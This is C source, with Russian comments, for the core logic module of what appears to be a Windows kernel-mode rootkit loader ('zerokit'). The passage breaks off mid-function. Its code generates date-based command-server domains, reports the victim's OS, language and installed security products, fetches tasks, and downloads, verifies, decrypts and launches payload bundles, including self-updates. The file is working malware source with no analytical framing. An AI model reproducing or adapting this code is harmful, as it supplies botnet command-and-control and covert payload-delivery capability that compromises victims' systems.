#include "../../mod_shared/pack_protect.h"
#include "../../mod_shared/overlord_ext.h"
#include "../../mod_launcher/code/zshellcode.h"

// bool_t logic_check_for_connection()
// {
//     int err;
//     ip_addr_t srvAddr;
//     char* currentUrl;
//     USE_GLOBAL_BLOCK
// 
//     // Пробуем получить IP-адрес для текущего по списку URL-а, если получается, значит мы имеем доступ в интернет.
//     currentUrl = pGlobalBlock->pLogicBlock->currentUrl;
//     for (; *currentUrl != '\0'; ++currentUrl);
//     ++currentUrl;
//     if (*currentUrl == '\0') {
//         currentUrl = pGlobalBlock->pLogicBlock->testUrlList;
//     }
// 
//     pGlobalBlock->pLogicBlock->currentUrl = currentUrl;
// 
//     err = pGlobalBlock->pTcpipBlock->fnnetconn_gethostbyname(currentUrl, &srvAddr);
//     if (err == ERR_OK) {
//          return TRUE;
//     }
// 
//     return FALSE;
// }

// KNOCK_RESULT logic_send_info_to_server()
// {
//     KNOCK_RESULT knockResult = KR_OK;
//     USE_GLOBAL_BLOCK
// 
//     // Отправляем информацию на сервер.
//     if (pGlobalBlock->pLogicBlock->needChangeServer) {
//         // Получаем нужную информацию о системе.
//         pGlobalBlock->pLogicBlock->fnlogic_obtain_system_info();
// 
//         knockResult = pGlobalBlock->pLogicBlock->fnlogic_make_knock_to_server(NRT_SYSTEM_INFO);
//         if (knockResult == KR_OK) {
//             pGlobalBlock->pLogicBlock->needChangeServer = FALSE;
//         }
//     }
// 
//     return knockResult;
// }

bool_t logic_reconfigure(bool_t onlyNdisNet)
{
    bool_t ret = FALSE;
    uint32_t dataSize;
    USE_GLOBAL_BLOCK

    do {
        if (pGlobalBlock->pNetworkBlock->pActiveAdapter == NULL || pGlobalBlock->pNetworkBlock->pActiveAdapter->pNext == NULL) {
            if (!onlyNdisNet) {
                pGlobalBlock->pNetcommBlock->userMode = 0;
            }

            // Удаляем все текущие сетевые адаптеры.
            pGlobalBlock->pNetworkBlock->fnnetwork_destroy_all_adapters();

            // Ищем сетевые адаптеры...
            if (!pGlobalBlock->pNetworkBlock->fnnetwork_search_for_adapters()) {
                break;
            }
        }

        // Пытаемся получить информацию о сети от OVerlord-а.
        if (pGlobalBlock->pLauncherBlock->fnlauncher_overlord_request(ORID_NETWORK_INFO, NULL, 0, (uint8_t**)&pGlobalBlock->pCommonBlock->pAdapters, &dataSize)) {
            pGlobalBlock->pCommonBlock->adaptersCount = *(uint32_t*)(((uint8_t*)pGlobalBlock->pCommonBlock->pAdapters) + dataSize - sizeof(uint32_t));
        }

        // Пробегаемся по доступным и возможным к использованию адаптерам.
        // Примечание: Адаптер считается возможным к использованию, если удалось принять пакет, предназначенный для данного узла
        // и получить MAC-адрес сетевой карты, чтобы использовать его в нашем стеке.
        if (pGlobalBlock->pNetworkBlock->fnnetwork_plug_next_adapter()) {
            // Конфигурируем наш стек для работы с выбранным активным адаптером.
            pGlobalBlock->pTcpipBlock->fntcpip_reinit_stack_for_adapter(pGlobalBlock->pNetworkBlock->pActiveAdapter);

            // Устанавливаем реальный обработчик входящих пакетов.
            pGlobalBlock->pNetworkBlock->fnnetwork_set_input_packet_handler(pGlobalBlock->pTcpipBlock->fntcpip_receive);

            pGlobalBlock->pNetworkBlock->needReconfigure = FALSE;

            pGlobalBlock->pNetworkBlock->fnnetwork_confirm_active_adapter();
            FnKdPrint(("   STACK CONFIGURED!\n"));
            ret = TRUE;
        }
    } while (0);

    // Удаляем данные полученные от Overlord-а.
    if (pGlobalBlock->pCommonBlock->pAdapters != NULL) {
        pGlobalBlock->pCommonBlock->fnExFreePoolWithTag(pGlobalBlock->pCommonBlock->pAdapters, LOADER_TAG);
        pGlobalBlock->pCommonBlock->pAdapters = NULL;
        pGlobalBlock->pCommonBlock->adaptersCount = 0;
    }

    // Проверяем доступность интернета в ring3.
    if (pGlobalBlock->pLauncherBlock->fnlauncher_overlord_request(ORID_NETCOMM_CHECK, NULL, 0, NULL, NULL)) {
        if (!onlyNdisNet && pGlobalBlock->pNetworkBlock->needReconfigure == TRUE) {
            pGlobalBlock->pNetcommBlock->userMode = 1;
            ret = TRUE;
        }
    }

    if (ret) {
        if (pGlobalBlock->pLogicBlock->lastNtpTime == 0) {
            // Получаем время от NTP-сервера (один раз, при запуске).

            // Если не получится запросить время у NTP-сервера получаем текущее системное время.
            pGlobalBlock->pLogicBlock->lastNtpTime = pGlobalBlock->pCommonBlock->fncommon_get_system_time();

            if (pGlobalBlock->pNetcommBlock->userMode) {
                uint8_t* overlordData;
                uint32_t overlordDataSize;
                if (pGlobalBlock->pLauncherBlock->fnlauncher_overlord_request(ORID_NETCOMM_GET_NTP, NULL, 0, &overlordData, &overlordDataSize)) {
                    pGlobalBlock->pLogicBlock->lastNtpTime = *(uint32_t*)overlordData;
                    pGlobalBlock->pCommonBlock->fnExFreePoolWithTag(overlordData, LOADER_TAG);
                }
            }
            else {
                // Устанавливаем или проверяем наличие хуков.
                pGlobalBlock->pNetworkBlock->fnnetwork_validate_hooks();
                pGlobalBlock->pTcpipBlock->fntcpip_get_ntp_time(&pGlobalBlock->pLogicBlock->lastNtpTime);
            }
#ifdef _WIN64
            KeQueryTickCount(&pGlobalBlock->pLogicBlock->lastSystemTimestamp);
#else
            pGlobalBlock->pCommonBlock->fnKeQueryTickCount(&pGlobalBlock->pLogicBlock->lastSystemTimestamp);
#endif
        }
    }

    return ret;
}

bool_t logic_read_public_key(rsa_context_t* pRsa, uint8_t* buffer)
{
    uint8_t* ptr;
    uint16_t sz;
    USE_GLOBAL_BLOCK

    // Инициализируем RSA контекст.
    pGlobalBlock->pCommonBlock->fnrsa_init(pRsa, RSA_PKCS_V15, 0);

    // Считываем из конфига открытый ключ.
    ptr = buffer;

    sz = *(uint16_t*)ptr;
    ptr += 2;
    if (pGlobalBlock->pCommonBlock->fnmpi_read_binary(&pRsa->N, ptr, sz)) {
        return FALSE;
    }
    ptr += sz;

    sz = *(uint16_t*)ptr;
    ptr += 2;
    if (pGlobalBlock->pCommonBlock->fnmpi_read_binary(&pRsa->E, ptr, sz)) {
        return FALSE;
    }
    ptr += sz;

    pRsa->len = (pGlobalBlock->pCommonBlock->fnmpi_msb(&pRsa->N) + 7) >> 3;

    return TRUE;
}

KNOCK_RESULT logic_make_knock_to_server(netcomm_request_type nrt)
{
    int err;
    KNOCK_RESULT res = KR_NEED_NETCOMM_RECONFIGURE;
    uint8_t* dataBase = NULL;
    uint8_t* dataFromServer = NULL;
    uint32_t dataSize;
    USE_GLOBAL_BLOCK

    err = pGlobalBlock->pNetcommBlock->fnnetcomm_send_request_to_server(nrt, &dataFromServer, &dataSize, &dataBase);
    if (err != ERR_OK || dataSize == 0) {
        // Проверяем нужно ли нам переконфигурировать сеть.
        if (err == ERR_CONN) {
            res = KR_NEED_NETWORK_RECONFIGURE;
        }
    }
    else if (pGlobalBlock->pLogicBlock->fnlogic_validate_server_response(nrt, dataFromServer, dataSize)) {
        res = KR_OK;
    }

    if (dataBase != NULL) {
        pGlobalBlock->pCommonBlock->fnExFreePoolWithTag(dataBase, LOADER_TAG);
    }

    return res;
}

char* logic_generate_name_for_date(uint32_t unixTime)
{
    char* name;
    uint32_t i, currPeriod, seed, nameLen, minVal, maxVal;
    rsa_context_t rsa;
    pconfiguration_t pConfig;
    uint32_t affId;
    USE_GLOBAL_BLOCK

    affId = pGlobalBlock->pCommonBlock->zerokitHeader.affid;

    pConfig = pGlobalBlock->pCommonBlock->pConfig;

    currPeriod = (unixTime/3600) / pGlobalBlock->pCommonBlock->pConfig->gen_unique_period;

    seed = currPeriod ^ (affId | (affId << 16));

    pGlobalBlock->pLogicBlock->fnlogic_read_public_key(&rsa, pGlobalBlock->pCommonBlock->pConfig->publicKey);

    pGlobalBlock->pCommonBlock->fncrypto_random_init(&rsa);

    for (i = 0; i < 776; ++ i) {
        pGlobalBlock->pCommonBlock->fncrypto_random(&seed);
    }

    minVal = pConfig->gen_min_name_len + (pGlobalBlock->pCommonBlock->fncrypto_random(&seed) % (pConfig->gen_max_name_len - pConfig->gen_min_name_len + 1));
    nameLen = pConfig->gen_min_name_len + (pGlobalBlock->pCommonBlock->fncrypto_random(&seed) % (pConfig->gen_max_name_len - pConfig->gen_min_name_len + 1));
    maxVal = max(nameLen, minVal);
    if (minVal == maxVal) {
        minVal = nameLen;
    }

    nameLen = minVal + (pGlobalBlock->pCommonBlock->fncrypto_random(&seed) % (maxVal - minVal + 1));

    pGlobalBlock->pCommonBlock->fncommon_allocate_memory(pGlobalBlock->pCommonBlock, &name, nameLen + 1, NonPagedPool);

    for (i = 0; i < nameLen; ++i) {
        uint32_t val = 48 + (pGlobalBlock->pCommonBlock->fncrypto_random(&seed) % (83 - 48));

        if (val > 57) {
            val += 39;
        }
        name[i] = (char)val;
    }

    pGlobalBlock->pCommonBlock->fnrsa_free(&rsa);
    return name;
}

bool_t logic_check_for_new_period()
{
    char *name, *names;
    LARGE_INTEGER timeStamp;
    uint32_t timeAdd;
    USE_GLOBAL_BLOCK

#ifdef _WIN64
    KeQueryTickCount(&timeStamp);
    timeAdd = (uint32_t)((INT64)pGlobalBlock->pCommonBlock->timeIncrement * (timeStamp.QuadPart - pGlobalBlock->pLogicBlock->lastSystemTimestamp.QuadPart) / 10000000I64);
#else
    pGlobalBlock->pCommonBlock->fnKeQueryTickCount(&timeStamp);
    timeAdd = (uint32_t)pGlobalBlock->pCommonBlock->fn_alldiv(pGlobalBlock->pCommonBlock->fn_allmul((INT64)pGlobalBlock->pCommonBlock->timeIncrement, timeStamp.QuadPart - pGlobalBlock->pLogicBlock->lastSystemTimestamp.QuadPart), 10000000I64);
#endif

    pGlobalBlock->pLogicBlock->lastNtpTime += timeAdd;
    pGlobalBlock->pLogicBlock->lastSystemTimestamp.QuadPart = timeStamp.QuadPart;

    name = pGlobalBlock->pLogicBlock->fnlogic_generate_name_for_date(pGlobalBlock->pLogicBlock->lastNtpTime);
    names = pGlobalBlock->pCommonBlock->pConfig->names;

    for ( ; *names != '\0'; names += pGlobalBlock->pCommonBlock->fnstrlen(names) + 1) {
        if (pGlobalBlock->pCommonBlock->fnstrcmp(name, names) == 0) {
            break;
        }
    }

    pGlobalBlock->pCommonBlock->fnExFreePoolWithTag(name, LOADER_TAG);

    return (*names == '\0');
}

NTSTATUS logic_generate_names()
{
    uint16_t i;
    char *name, *ptr, *end;
    uint32_t currPeriod, uniquePeriod, len, listNameLen;
    LARGE_INTEGER timeStamp;
    uint32_t timeAdd;
    USE_GLOBAL_BLOCK

    // Подготавливаем список имён для добавления новых.
    ptr = pGlobalBlock->pCommonBlock->pConfig->names;
    end = ptr + sizeof(pGlobalBlock->pCommonBlock->pConfig->names);
#if DBG
    pGlobalBlock->pCommonBlock->fncommon_disable_wp();
#endif // DBG
    for (; *ptr != '\0'; ptr += (len + 1)) {
        len = pGlobalBlock->pCommonBlock->fnstrlen(ptr);

        ptr[len] = ';';
    }

    __stosb(ptr, 0, end - ptr);
#if DBG
    pGlobalBlock->pCommonBlock->fncommon_enable_wp();
#endif // DBG

    uniquePeriod = pGlobalBlock->pCommonBlock->pConfig->gen_unique_period;
    currPeriod = (pGlobalBlock->pLogicBlock->lastNtpTime / 3600) / uniquePeriod;
    currPeriod = (currPeriod * uniquePeriod + uniquePeriod * (pGlobalBlock->pCommonBlock->pConfig->rtr_names_count - 1)) * 3600;
    for (i = 0; i < pGlobalBlock->pCommonBlock->pConfig->rtr_names_count; ++i, currPeriod -= (uniquePeriod * 3600)) {
        name = pGlobalBlock->pLogicBlock->fnlogic_generate_name_for_date(currPeriod);
        len = pGlobalBlock->pCommonBlock->fnstrlen(name) + 1;
        listNameLen = pGlobalBlock->pCommonBlock->fnstrlen(pGlobalBlock->pCommonBlock->pConfig->names);

        while ((len + listNameLen) >= 1024) {
            ptr = pGlobalBlock->pCommonBlock->pConfig->names + listNameLen - 2;
            for ( ; *ptr != ';'; --ptr); ++ptr;
#if DBG
            pGlobalBlock->pCommonBlock->fncommon_disable_wp();
#endif // DBG
            __stosb(ptr, 0, end - ptr);
#if DBG
            pGlobalBlock->pCommonBlock->fncommon_enable_wp();
#endif // DBG
            listNameLen = pGlobalBlock->pCommonBlock->fnstrlen(pGlobalBlock->pCommonBlock->pConfig->names);
        }
#if DBG
        pGlobalBlock->pCommonBlock->fncommon_disable_wp();
#endif // DBG
        pGlobalBlock->pCommonBlock->fnmemmove(pGlobalBlock->pCommonBlock->pConfig->names + len, pGlobalBlock->pCommonBlock->pConfig->names, listNameLen);
        pGlobalBlock->pCommonBlock->fnmemcpy(pGlobalBlock->pCommonBlock->pConfig->names, name, len);
        pGlobalBlock->pCommonBlock->pConfig->names[len - 1] = ';';
        pGlobalBlock->pCommonBlock->fnExFreePoolWithTag(name, LOADER_TAG);
#if DBG
        pGlobalBlock->pCommonBlock->fncommon_enable_wp();
#endif // DBG
    }

#if DBG
    pGlobalBlock->pCommonBlock->fncommon_disable_wp();
#endif // DBG
    pGlobalBlock->pCommonBlock->pConfig->activeName = pGlobalBlock->pCommonBlock->pConfig->activeZone = 0;
    // Подготавливаем список имён для добавления новых.
    ptr = pGlobalBlock->pCommonBlock->pConfig->names;
    end = ptr + pGlobalBlock->pCommonBlock->fnstrlen(pGlobalBlock->pCommonBlock->pConfig->names);
    for ( ; ptr < end; ++ptr) {
        if (*ptr == ';') {
            *ptr = '\0';
        }
    }
#if DBG
    pGlobalBlock->pCommonBlock->fncommon_enable_wp();
#endif // DBG

    // Узнаём и сохраняем время текущей (крайней) генерации.
#ifdef _WIN64
    KeQueryTickCount(&timeStamp);
    timeAdd = (uint32_t)((INT64)pGlobalBlock->pCommonBlock->timeIncrement * (timeStamp.QuadPart - pGlobalBlock->pLogicBlock->lastSystemTimestamp.QuadPart) / 10000000I64);
#else
    pGlobalBlock->pCommonBlock->fnKeQueryTickCount(&timeStamp);
    timeAdd = (uint32_t)pGlobalBlock->pCommonBlock->fn_alldiv(pGlobalBlock->pCommonBlock->fn_allmul((INT64)pGlobalBlock->pCommonBlock->timeIncrement, timeStamp.QuadPart - pGlobalBlock->pLogicBlock->lastSystemTimestamp.QuadPart), 10000000I64);
#endif

#if DBG
    pGlobalBlock->pCommonBlock->fncommon_disable_wp();
#endif // DBG
    pGlobalBlock->pCommonBlock->pConfig->lastNtpGenTime = pGlobalBlock->pLogicBlock->lastNtpTime + timeAdd;
#if DBG
    pGlobalBlock->pCommonBlock->fncommon_enable_wp();
#endif // DBG

    // Обязательно сохраняем новый список доменов.
    return pGlobalBlock->pLogicBlock->fnlogic_save_config();
}

void logic_obtain_system_info()
{
    NTSTATUS ntStatus;
    RTL_OSVERSIONINFOEXW versionInfo;
    HANDLE regHandle;
    //      NDIS_STRING langsKey = NDIS_STRING_CONST("\\Registry\\Machine\\System\\ControlSet001\\Control\\Nls\\Language");
    //      NDIS_STRING langKey = NDIS_STRING_CONST("Default");
    ulong_t resultLength;
    wchar_t langValue[6];
    UNICODE_STRING lVal;
    uint16_t osVer;
    uint16_t osLang;
    uint8_t* ptr;
    uint8_t* pHipsData;
    uint32_t dataSize;
    USE_GLOBAL_BLOCK

    pGlobalBlock->pCommonBlock->fnmemset(&langValue, 0, 6 * sizeof(wchar_t));

    versionInfo.dwOSVersionInfoSize = sizeof(RTL_OSVERSIONINFOEXW);
    ntStatus = pGlobalBlock->pCommonBlock->fnRtlGetVersion((PRTL_OSVERSIONINFOW)&versionInfo);

    //    Operating system        Version number dwMajorVersion dwMinorVersion Other 
    //    Windows 7                            6.1    wProductType == VER_NT_WORKSTATION  
    //    Windows Server 2008 R2                6.1    wProductType != VER_NT_WORKSTATION  
    //    Windows Server 2008                    6.0    wProductType != VER_NT_WORKSTATION  
    //    Windows Vista 6.0                    6 0    wProductType == VER_NT_WORKSTATION  
    //    Windows Home Server                    5.2    wSuiteMask == VER_SUITE_WH_SERVER  
    //    Windows Server 2003                    5.2    Not applicable  
    //    Windows XP Professional x64 Edition    5.2    wProductType == VER_NT_WORKSTATION  
    //    Windows XP                            5.1    Not applicable  
    //
    // #define VER_NT_WORKSTATION              0x0000001
    // #define VER_NT_DOMAIN_CONTROLLER        0x0000002
    // #define VER_NT_SERVER                   0x0000003
    //
    //    
    //  os_ver + os_platform + os_bits
    //  Windows 7 x32 = 22 + 1 + 0 = 23
    //  Windows 7 x64 = 22 + 1 + 1 = 24
    //  Windows Server 2008 R2 x64 = 22 + 3 + 1 = 26
    //  Windows Vista x32 = 6 + 1 + 0 = 7
    //  Windows Vista x64 = 6 + 1 + 1 = 8
    //  Windows Server 2008 x32 = 6 + 3 + 0 = 9
    //  Windows Server 2008 x64 = 6 + 3 + 1 = 10
    //  Windows Server 2003 x32 = 37 + 3 + 0 = 40
    //  Windows Server 2003 x64 = 37 + 3 + 1 = 41
    //  Windows XP x32 = 21 + 1 + 0 = 22
    //  Windows XP x64 = 37 + 1 + 1 = 39

    osVer = (int)(((versionInfo.dwMajorVersion & 0x0f) | ((versionInfo.dwMinorVersion & 0x0f) << 4)) + (int)versionInfo.wProductType + 
#ifdef _WIN64
        1
#else
        0
#endif
        );
    osVer |= (versionInfo.wServicePackMajor & 0x0f) << 8;
    osVer |= (versionInfo.wServicePackMinor & 0x0f) << 12;

    // Узнаём язык системы
    langValue[0] = 0;
    ntStatus = pGlobalBlock->pCommonBlock->fnRegistryOpenKey(&regHandle, pGlobalBlock->pLogicBlock->langsKey);
    if (ntStatus == STATUS_SUCCESS) {
        pGlobalBlock->pCommonBlock->fnRegistryReadValue(regHandle, pGlobalBlock->pLogicBlock->langKey, (wchar_t*)langValue);
        pGlobalBlock->pCommonBlock->fnZwClose(regHandle);
    }

    if (langValue[0] == 0) {
        ptr = (uint8_t*)langValue;
        *(((PUINT32)ptr)++) = 0x00340030;
        *(((PUINT32)ptr)++) = 0x00390031;
        *((PUINT16)ptr) = 0x0000;
    }
    pGlobalBlock->pCommonBlock->fnRtlInitUnicodeString(&lVal, langValue);
    ntStatus = pGlobalBlock->pCommonBlock->fnRtlUnicodeStringToInteger(&lVal, 16, &resultLength);
    if (ntStatus == STATUS_SUCCESS) {
        osLang = (uint16_t)(resultLength & 0xffff);
    }

    pGlobalBlock->hipsMask = 0x0ULL;
    // Собираем информацию о HIPS-ах от Overlord-а.
    if (pGlobalBlock->pLauncherBlock->fnlauncher_overlord_request(ORID_HIPS_INFO, NULL, 0, (uint8_t**)&pHipsData, &dataSize)) {
        pGlobalBlock->hipsMask = *(uint64_t*)pHipsData;
        pGlobalBlock->pCommonBlock->fnExFreePoolWithTag(pHipsData, LOADER_TAG);
    }

    pGlobalBlock->osVer = osVer;
    pGlobalBlock->osLang = osLang;
}

bool_t logic_validate_server_response(netcomm_request_type nrt, uint8_t* data, uint32_t dataSize)
{
    int err;
    uint8_t* itr;
    uint8_t* end;
    uint8_t* tokenId;
    uint8_t* tokenUrl;
    uint8_t* tokenFilter;
    size_t lenUrl = 0;
    size_t lenFilter = 0;
    ptask_t pTask = NULL;
    uint32_t taskId;
    uint32_t taskGroupId;
    char* taskUrl;
    char* taskFilter;
    uint32_t i;
    rsa_context_t rsa;
    uint8_t shaHash[20];
    int hashSize = 0;

    USE_GLOBAL_BLOCK

    if (data == NULL || dataSize < (128 + LOADER_ID_SIZE)) {
        return FALSE;
    }

    if (!pGlobalBlock->pLogicBlock->fnlogic_read_public_key(&rsa, pGlobalBlock->pCommonBlock->pConfig->publicSKey)) {
        pGlobalBlock->pCommonBlock->fnrsa_free(&rsa);
        return FALSE;
    }

    // Дешифруем SHA-1 дайджест - ключ для дешифрования.
    err = pGlobalBlock->pCommonBlock->fnrsa_public_decrypt_hash(&rsa, data, shaHash, &hashSize);
    pGlobalBlock->pCommonBlock->fnrsa_free(&rsa);
    if (err != ERR_OK || hashSize != 20) {
        return FALSE;
    }

    data += 128;
    dataSize -= 128;

    // Расшифровываем данные
    pGlobalBlock->pCommonBlock->fnarc4_crypt_self(data, dataSize, shaHash, hashSize);

    if (pGlobalBlock->pCommonBlock->fnRtlCompareMemory(data, pGlobalBlock->pCommonBlock->pConfig->botId, LOADER_ID_SIZE) != LOADER_ID_SIZE) {
        return FALSE;
    }

    data += LOADER_ID_SIZE;
    dataSize -= LOADER_ID_SIZE;

    if (nrt == NRT_SYSTEM_INFO) {
        if (dataSize != 6) {
         return FALSE;
        }
        pGlobalBlock->externalIp = *(uint32_t*)data;
        pGlobalBlock->countryCode = *(uint16_t*)(data + sizeof(uint32_t));

        return TRUE;
    }
    else if (nrt == NRT_TASKS_REQUEST) {
        // Если у нас нет заданий, возращаем сразу true.
        if (dataSize == 0) {
            return TRUE;
        }

        // Инициализируем i, чтобы учесть смещение при извлечении задач.
        i = 0;

        itr = data;
        end = itr + dataSize;

        // Формат списка task_id1|uri1|filter1||task_id2|uri2|filter2||...||task_idN|uriN|filterN

        for ( ; itr < end; ++itr) {
            tokenId = itr;

            for ( ; *itr != '|' && itr < end; ++itr);
            if (*itr != '|') {
                continue;
            }
            *itr = 0;
            taskId = (uint32_t)pGlobalBlock->pCommonBlock->fncommon_atou64(tokenId, 32);

            tokenId = ++itr;

            for ( ; *itr != '|' && itr < end; ++itr);
            if (*itr != '|') {
                continue;
            }
            *itr = 0;
            taskGroupId = (uint32_t)pGlobalBlock->pCommonBlock->fncommon_atou64(tokenId, 32);

            tokenUrl = ++itr;

            for ( ; *itr != '|' && itr < end; ++itr);
            if (*itr != '|') {
                continue;
            }
            *itr = 0;
            lenUrl = pGlobalBlock->pCommonBlock->fncommon_strlen_s(tokenUrl, NTSTRSAFE_MAX_CCH);

            if (lenUrl == 0) {
                continue;
            }

            tokenFilter = ++itr;

            for ( ; *itr != '|' && itr < end; ++itr);
            if (*itr != '|' && *(itr + 1) != '|') {
                continue;
            }
            *itr = 0;
            lenFilter = pGlobalBlock->pCommonBlock->fncommon_strlen_s(tokenFilter, NTSTRSAFE_MAX_CCH);

            if (lenFilter == 0) {
                continue;
            }

            pGlobalBlock->pCommonBlock->fncommon_allocate_memory(pGlobalBlock->pCommonBlock, &taskUrl, (uint32_t)(lenUrl + 1), NonPagedPool);
            __movsb(taskUrl, tokenUrl, lenUrl + 1);

            pGlobalBlock->pCommonBlock->fncommon_allocate_memory(pGlobalBlock->pCommonBlock, &taskFilter, (uint32_t)(lenFilter + 1), NonPagedPool);
            __movsb(taskFilter, tokenFilter, lenFilter + 1);

            pGlobalBlock->pCommonBlock->fncommon_allocate_memory(pGlobalBlock->pCommonBlock, &pTask, sizeof(task_t), NonPagedPool);

            pTask->id = taskId;
            pTask->groupId = taskGroupId;
            pTask->uri = taskUrl;
            pTask->filter = taskFilter;
            ++itr;

            pGlobalBlock->pTasksBlock->fntasks_add_task(pTask);
        }

        return TRUE;
    }
    else if (nrt == NRT_TASKS_REPORT) {
        // Всегда должен быть результат!
        if (dataSize != 0) {
            return FALSE;
        }

        pGlobalBlock->pTasksBlock->fntasks_remove_all();

        return TRUE;
    }
    else if (nrt == NRT_BUNDLE_CHECK) {
        if (dataSize == 0) {
            return TRUE;
        }

        if (dataSize <= 20) {
            return FALSE;
        }

        // Нет необходимости копировать SHA1, т. к. при успешном скачивании, SHA1 будет расчитана.
        __movsb(pGlobalBlock->pCommonBlock->currFileURI, data + 20, dataSize - 20);
        return TRUE;
    }

    return FALSE;
}

uint8_t logic_process_bundle(uint8_t* packBuffer, uint8_t** pBundleBuffer, uint32_t* pBundleSize, uint8_t* pSha1Hash)
{
    psign_pack_header_t pSignPackHeader;
    int err;
    uint8_t ret = TS_InternalError;
    ELzmaStatus st;
    rsa_context_t rsa;
    uint8_t shaHash[20];
    uint8_t realShaHash[20];
    int hashSize = 0;
    uint8_t* bundleBuffer = NULL;
    USE_GLOBAL_BLOCK

    do {
        // Проверяем валидность загруженного пейлода
        pSignPackHeader = (psign_pack_header_t)packBuffer;
        if (!pGlobalBlock->pLogicBlock->fnlogic_read_public_key(&rsa, pGlobalBlock->pCommonBlock->pConfig->publicKey)) {
            break;
        }

        // Дешифруем SHA-1 дайджест - ключ для дешифрования.
        err = pGlobalBlock->pCommonBlock->fnrsa_public_decrypt_hash(&rsa, pSignPackHeader->sign, shaHash, &hashSize);
        if (err != ERR_OK || hashSize != 20) {
            ret = TS_InvalidSign;
            break;
        }

        if (pSha1Hash != NULL) {
            // Подсчитываем SHA1 хеш бандла, который будет сохранён для проверки наличия обновлений.
            pGlobalBlock->pCommonBlock->fnsha1(packBuffer, pSignPackHeader->sizeOfFile + sizeof(sign_pack_header_t), pSha1Hash);
        }

        // Расшифровываем тело пака...
        pGlobalBlock->pCommonBlock->fnarc4_crypt_self(packBuffer + sizeof(sign_pack_header_t), pSignPackHeader->sizeOfFile, shaHash, (uint32_t)hashSize);

        // Подсчитываем SHA1 хеш...
        pGlobalBlock->pCommonBlock->fnsha1(packBuffer + sizeof(sign_pack_header_t), pSignPackHeader->sizeOfFile, realShaHash);

        if (pGlobalBlock->pCommonBlock->fnRtlCompareMemory(shaHash, realShaHash, (size_t)hashSize) != 20) {
            ret = TS_HashError;
            break;
        }

        pGlobalBlock->pCommonBlock->fncommon_allocate_memory(pGlobalBlock->pCommonBlock, &bundleBuffer, pSignPackHeader->origSize, NonPagedPool);
        err = pGlobalBlock->pCommonBlock->fnlzma_decode(bundleBuffer, &pSignPackHeader->origSize, packBuffer + sizeof(sign_pack_header_t), pSignPackHeader->sizeOfFile, &st);

        if (err != ERR_OK) {
            ret = TS_DecompressError;
            break;
        }

        *pBundleBuffer = bundleBuffer;
        *pBundleSize = pSignPackHeader->origSize;
        ret = 0;
    } while (0);

    pGlobalBlock->pCommonBlock->fnrsa_free(&rsa);

    return ret;
}

void logic_process_tasks()
{
    ptask_t pTask = NULL;
    uint8_t* payloadData;
    uint8_t* httpResponse;
    uint32_t payloadSize;
    USE_GLOBAL_BLOCK

    // Первым делом скачиваем пейлоды для всех полученных заданий.
    for ( ; (pTask = pGlobalBlock->pTasksBlock->fntasks_get_next_obtained(pTask)) != NULL; ) {
        do {
            uint8_t err;

            httpResponse = NULL;

            pGlobalBlock->pCommonBlock->fncommon_strcpy_s(pGlobalBlock->pCommonBlock->currFileURI, sizeof(pGlobalBlock->pCommonBlock->currFileURI), pTask->uri);
            if (pGlobalBlock->pNetcommBlock->fnnetcomm_send_request_to_server(NRT_DOWNLOAD_FILE, &payloadData, &payloadSize, &httpResponse) != ERR_OK) {
                // Переходим к следующему заданию.
                break;
            }

//             {
//                 uint32_t val = 1;
//                 char filename[] = {'\\', '?', '?' ,'\\', 'C', ':', '\\', '1', '.', 'x', '\0'};
//                 pGlobalBlock->pCommonBlock->fncommon_save_file(filename, payloadData, payloadSize);
//             }

            err = pGlobalBlock->pLogicBlock->fnlogic_process_bundle(payloadData, &pTask->packBuffer, &pTask->packSize, pTask->sha1Hash);
            if (err != 0) {
                pTask->status = err;
            }
        } while (0);

        if (httpResponse != NULL) {
            pGlobalBlock->pCommonBlock->fnExFreePoolWithTag(httpResponse, LOADER_TAG);
        }
    }

    // Обрабатываем задания.
    pTask = NULL;
    for ( ; (pTask = pGlobalBlock->pTasksBlock->fntasks_get_next_obtained(pTask)) != NULL && pTask->packBuffer != NULL; ) {
        pTask->status = TS_SaveError;
        if (pGlobalBlock->pLauncherBlock->fnlauncher_process_bundle((pbundle_header_t)pTask->packBuffer, pTask->sha1Hash, FALSE)) {
            pTask->status = TS_Completed;
        }
        pGlobalBlock->pCommonBlock->fnExFreePoolWithTag(pTask->packBuffer, LOADER_TAG);
    }
}

KNOCK_RESULT logic_check_bundle_updates()
{
    KNOCK_RESULT knockResult;
    uint8_t* packBuffer;
    uint8_t* bundleBuffer;
    uint32_t bundleSize;
    pbundle_info_entry_t pHeadBundleEntry, pBundleEntry;
    uint32_t count, i;
    uint8_t sha1Hash[20];
    bool_t needSave = FALSE;
    USE_GLOBAL_BLOCK

    knockResult = KR_OK;

    pGlobalBlock->pTasksBlock->fntasks_load_bundle_entries(&pHeadBundleEntry, &count);

    for (i = 0, pBundleEntry = pHeadBundleEntry; i < count; ++i, ++pBundleEntry) {
        if (pBundleEntry->updatePeriod > 0) {
            pBundleEntry->remainTime -= BUNDLES_CHECKOUT;
            if (pBundleEntry->remainTime <= 0) {
                needSave = TRUE;
                pBundleEntry->remainTime = 60 * pBundleEntry->updatePeriod;
                // Проверяем наличие обновления бандла.
                pGlobalBlock->pCommonBlock->currBundleName = pBundleEntry->name;
                pGlobalBlock->pCommonBlock->currBundleSha1 = pBundleEntry->sha1;
                __stosb(pGlobalBlock->pCommonBlock->currFileURI, 0, sizeof(pGlobalBlock->pCommonBlock->currFileURI));
                knockResult = pGlobalBlock->pLogicBlock->fnlogic_make_knock_to_server(NRT_BUNDLE_CHECK);
                if (knockResult != KR_OK) {
                    break;
                }

                // Загружаем бандл, если он обновился.
                if (pGlobalBlock->pCommonBlock->currFileURI[0] != '\0') {
                    uint32_t payloadSize;
                    uint8_t* httpResponse = NULL;

                    packBuffer = NULL;
                    if (pGlobalBlock->pNetcommBlock->fnnetcomm_send_request_to_server(NRT_DOWNLOAD_FILE, &packBuffer, &payloadSize, &httpResponse) == ERR_OK) {
                        if (pGlobalBlock->pLogicBlock->fnlogic_process_bundle(packBuffer, &bundleBuffer, &bundleSize, sha1Hash) == 0) {
                            if (pGlobalBlock->pCommonBlock->fncommon_calc_hash(pBundleEntry->name, pGlobalBlock->pCommonBlock->fnstrlen(pBundleEntry->name)) == 0x589EE3D2 &&
                                (((pbundle_header_t)bundleBuffer)->flags & BFLAG_UPDATE)) {
                                // Очередная инкарнация :)
                                pbundle_file_header_t pPackFileHeader = (pbundle_file_header_t)(bundleBuffer + sizeof(bundle_header_t));
#ifdef _WIN64
                                pmods_pack_header_t pModsPackHdr;
#endif // _WIN64
                                pzerokit_header_t pZerokitHeader;
                                uint32_t i;
